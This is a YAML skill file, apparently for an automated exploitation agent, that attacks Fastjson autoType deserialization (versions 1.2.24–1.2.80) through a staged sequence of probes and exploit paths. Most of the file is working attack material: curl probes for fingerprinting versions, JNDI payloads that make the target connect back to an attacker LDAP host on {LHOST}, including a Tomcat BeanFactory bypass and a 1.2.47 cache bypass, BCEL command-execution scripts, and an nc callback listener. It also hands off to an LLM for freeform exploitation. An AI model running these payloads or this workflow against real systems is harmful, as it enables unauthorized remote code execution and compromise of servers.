# ═══════════════════════════════════════════════════════════
# Fastjson autoType 反序列化 RCE
#
# 覆盖版本: 1.2.24 ~ 1.2.80
# 原理: autoType 允许 JSON 中 @type 指定反序列化类
# 路径选择: BCEL(无回连) > JNDI(需回连) > 手工payload > LLM兜底
# ═══════════════════════════════════════════════════════════
skill_id: fastjson_rce
name: "Fastjson autoType 反序列化 RCE"
category: java_deserialization
phase: foothold
version: "1.0"

principle: |
  Fastjson 的 autoType 特性在反序列化 JSON 时，允许通过 @type 字段指定任意
  Java 类进行实例化。攻击者可指定危险类触发：
  
  1. JNDI 查找（JdbcRowSetImpl.dataSourceName → LDAP/RMI → 远程类加载）
     - 需要目标回连攻击机
     - JDK 8u191+ 默认限制远程类加载，但可通过 Tomcat BeanFactory 等绕过
  
  2. BCEL ClassLoader（com.sun.org.apache.bcel.internal.util.ClassLoader）
     - 在目标 JVM 本地加载 BCEL 编码的字节码，不需要回连
     - 仅 JDK 8 可用（JDK 9+ 移除了 BCEL 包）
  
  3. TemplatesImpl（com.sun.org.apache.xalan.internal.xsltc.trax）
     - 需要目标开启 Feature.SupportNonPublicField，概率较低
  
  版本绕过关系:
    ≤1.2.24: 无限制，直接 @type
    1.2.25~41: 黑名单，L/; 前缀绕过
    1.2.42~47: 修复 L;，但 java.lang.Class 缓存绕过
    1.2.48~67: 修复缓存，需新 gadget
    1.2.68~80: safeMode + expectClass 绕过
    ≥1.2.83: 默认关闭，基本安全

match:
  rules:
    - fingerprint_contains: ["fastjson"]
    - fingerprint_contains: ["com.alibaba.fastjson"]
    - cve_matches: ["CVE-2017-18349", "CVE-2022-25845"]
    - evidence_contains: ["fastjson", "@type"]
    - json_probe_result: "FASTJSON_DETECTED"
  exclude:
    - fingerprint_contains: ["fastjson 2."]

# ───────────────────────────────────────────
# 探测阶段
# ───────────────────────────────────────────
probes:
  - id: confirm_fastjson
    description: "确认 fastjson 存在，粗测版本范围"
    command: |
      curl -s -X POST {ENDPOINT} \
        -H "Content-Type: application/json" \
        -d '{"@type":"java.lang.AutoCloseable"' \
        --max-time 10 -w "\nHTTP_CODE:%{http_code}"
    timeout: 15
    parse_rules:
      - if_contains: ["autoType is not support", "safeMode"]
        set: { fastjson_confirmed: true, autotype_blocked: true, version_tier: "gte_1.2.68" }
      - if_contains: ["type not match", "typeMismatch", "ClassNotFoundException"]
        set: { fastjson_confirmed: true, autotype_enabled: true, version_tier: "mid_1.2.25_67" }
      - if_contains: ["com.alibaba.fastjson", "fastjson"]
        set: { fastjson_confirmed: true }
      - if_contains: ["HTTP_CODE:4", "HTTP_CODE:5"]
        set: { json_endpoint_active: true }

  - id: version_probe_47
    description: "测试 1.2.47 java.lang.Class 缓存绕过是否可用"
    depends_on: { fastjson_confirmed: true }
    command: |
      curl -s -X POST {ENDPOINT} \
        -H "Content-Type: application/json" \
        -d '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1/a","autoCommit":true}}' \
        --max-time 10
    timeout: 15
    parse_rules:
      - if_contains: ["JdbcRowSetImpl", "connection refused", "connect timed out"]
        set: { bypass_47_works: true, version_tier: "lte_1.2.47" }
      - if_contains: ["autoType is not support", "deny"]
        set: { bypass_47_works: false, version_tier: "gte_1.2.48" }

  - id: version_probe_24
    description: "测试直接 @type 是否可用（≤1.2.24）"
    depends_on: { fastjson_confirmed: true }
    command: |
      curl -s -X POST {ENDPOINT} \
        -H "Content-Type: application/json" \
        -d '{"@type":"java.net.Inet4Address","val":"127.0.0.1"}' \
        --max-time 10
    timeout: 15
    parse_rules:
      - if_not_contains: ["error", "deny", "not support", "autoType"]
        set: { direct_autotype: true, version_tier: "lte_1.2.24" }

# ───────────────────────────────────────────
# 利用路径
# ───────────────────────────────────────────
exploit_paths:

  # ═══ 路径 A: BCEL（无回连，最优先）═══
  - path_id: bcel_rce
    name: "BCEL ClassLoader 本地命令执行"
    priority: 1
    principle: |
      利用 BCEL ClassLoader 在目标 JVM 本地加载恶意字节码。
      不需要回连，不受 JNDI trustURLCodebase 限制。
      需要 JDK 8（大多数 fastjson 应用的运行环境）。
    conditions:
      fastjson_confirmed: true
    steps:
      - id: bcel_id
        description: "BCEL 执行 id 命令验证 RCE"
        command: "python3 /opt/bcel_fastjson.py {ENDPOINT} id"
        timeout: 30
        success_criteria:
          stdout_regex: "uid=\\d+\\(\\w+\\)"
        on_success: bcel_whoami
        on_fail: next_path

      - id: bcel_whoami
        description: "确认当前用户"
        command: "python3 /opt/bcel_fastjson.py {ENDPOINT} whoami"
        timeout: 30
        success_criteria:
          stdout_not_empty: true
        on_success: conclude_success
        on_fail: conclude_success
        evidence_capture:
          current_user: stdout
          shell_type: "rce_bcel"

  # ═══ 路径 B: JNDI（需回连）═══
  - path_id: jndi_rce
    name: "JNDI 注入远程类加载"
    priority: 2
    principle: |
      通过 JdbcRowSetImpl 触发 JNDI 查找，目标回连攻击机的
      恶意 LDAP 服务加载远程类。JNDIExploit 工具内置多种绕过。
    conditions:
      fastjson_confirmed: true
      env.can_reverse: true
    steps:
      - id: jndi_default
        description: "JNDIExploit 默认 gadget 利用"
        command: "/opt/jndi_fastjson.sh {ENDPOINT} {LHOST} id"
        timeout: 120
        success_criteria:
          stdout_regex: "(uid=\\d+\\(\\w+\\)|JNDI_RCE_SUCCESS)"
        on_success: jndi_confirm
        on_fail: jndi_tomcat

      - id: jndi_tomcat
        description: "JNDIExploit Tomcat BeanFactory 绕过（高版本 JDK）"
        command: |
          # jndi_fastjson.sh 不支持 --gadget 参数
          # JNDIExploit 通过 LDAP URL 路径选择 bypass 方式
          # 直接用 curl 发 Tomcat BeanFactory bypass payload
          curl -s -X POST {ENDPOINT} \
            -H "Content-Type: application/json" \
            -d '{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{LHOST}:1389/TomcatBypass/Command/Base64/aWQ=","autoCommit":true}}' \
            --max-time 15
        timeout: 120
        success_criteria:
          stdout_regex: "(uid=\\d+\\(\\w+\\)|JNDI_RCE_SUCCESS)"
        on_success: jndi_confirm
        on_fail: next_path

      - id: jndi_confirm
        description: "JNDI RCE 确认"
        command: "/opt/jndi_fastjson.sh {ENDPOINT} {LHOST} whoami"
        timeout: 120
        success_criteria:
          stdout_not_empty: true
        on_success: conclude_success
        evidence_capture:
          current_user: stdout
          shell_type: "rce_jndi"

  # ═══ 路径 C: 手工 payload 验证 ═══
  - path_id: manual_payloads
    name: "手工 Payload 验证"
    priority: 3
    principle: |
      BCEL 工具和 JNDI 都不可用时，用已知的 bypass payload 直接验证。
      注意：fastjson 的 @type 注入需要放在嵌套对象中，
      不能放在根对象（如果控制器绑定了具体类型如 User，根级 @type 会报 type not match）。
    conditions:
      fastjson_confirmed: true
    steps:
      - id: bypass_47_manual
        description: "1.2.47 java.lang.Class 缓存绕过 + JNDI（嵌套对象格式）"
        command: |
          # 如果 LHOST 可用，启动 JNDIExploit 然后发 payload
          LHOST="{LHOST}"
          if [ -n "$LHOST" ] && [ "$LHOST" != "" ]; then
            # 先发 payload 触发 JNDI 连接（JNDIExploit 可能已经在跑）
            curl -s -X POST {ENDPOINT} \
              -H "Content-Type: application/json" \
              -d "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://${LHOST}:1389/Basic/Command/id\",\"autoCommit\":true}}" \
              --max-time 15
          else
            echo "NO_LHOST_SKIP"
          fi
        timeout: 20
        success_criteria:
          stdout_regex: "uid=\\d+\\(\\w+\\)"
        on_success: conclude_success
        on_fail: next_step

      - id: dns_verify
        description: "DNS 外带验证（确认 JNDI 连接是否发生）"
        command: |
          # 用 dnslog 或直接看 JNDI 日志判断目标是否回连了
          # 这里用一个轻量级方式：发 payload 指向自己的 nc 监听
          LHOST="{LHOST}"
          if [ -n "$LHOST" ] && [ "$LHOST" != "" ]; then
            # 后台监听 1 秒看有没有连接
            timeout 8 bash -c "
              echo '' | nc -l -p 13389 &
              NCPID=\$!
              sleep 1
              curl -s -X POST {ENDPOINT} \
                -H 'Content-Type: application/json' \
                -d '{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://${LHOST}:13389/test\",\"autoCommit\":true}}' \
                --max-time 5 > /dev/null 2>&1
              sleep 3
              kill \$NCPID 2>/dev/null
              wait \$NCPID 2>/dev/null
            " 2>&1
            # nc 被连接后会退出，说明 JNDI 回连成功
            echo "JNDI_CONNECT_TEST_DONE"
          else
            echo "NO_LHOST_FOR_DNS"
          fi
        timeout: 15
        success_criteria:
          stdout_regex: "(uid=\\d+\\(\\w+\\)|JNDI_CONNECT)"
        on_success: conclude_success
        on_fail: next_path

  # ═══ 路径 D: LLM 兜底 ═══
  - path_id: llm_freeform
    name: "LLM 自由推理"
    priority: 99
    mode: react_freeform
    max_rounds: 5
    conditions:
      fastjson_confirmed: true

remediation: |
  1. 升级至 Fastjson 2.x 或替换为 Jackson/Gson
  2. 无法升级时启用 safeMode: ParserConfig.getGlobalInstance().setSafeMode(true)
  3. WAF 拦截包含 @type 的 JSON 请求
  4. 限制出站网络连接（阻止 JNDI 回连）